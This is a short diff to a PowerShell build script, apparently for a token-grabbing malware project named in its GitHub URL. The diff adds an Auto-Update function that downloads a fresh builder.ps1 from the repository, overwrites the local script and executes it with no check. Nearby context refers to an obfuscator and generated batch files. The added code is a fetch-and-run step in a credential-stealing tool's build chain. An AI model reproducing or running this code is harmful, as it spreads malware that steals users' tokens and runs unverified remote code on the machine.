@@ -180,6 +180,22 @@ function Invoke-EXE {
     Remove-Item -Path $current_dir\main.bat.ultimate.bat -ErrorAction SilentlyContinue
 }
 
+function Auto-Update {
+    $url = "https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/builder.ps1"
+    $downloaded = Invoke-WebRequest -Uri $url -UseBasicParsing
+    $downloaded = $downloaded.Content
+    $current_file_content = Get-Content -Path $PSCommandPath
+    if ($current_file_content -ne $downloaded) {
+        $downloaded | Out-File -FilePath "$PSScriptRoot\builder.ps1"
+        & "$PSScriptRoot\builder.ps1"
+        Exit
+    } else {
+        Write-Host "No update found"
+    }
+}
+
+Auto-Update
+
 try {
     $current_dir = Get-Location
     $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\Somalifuscator-main"
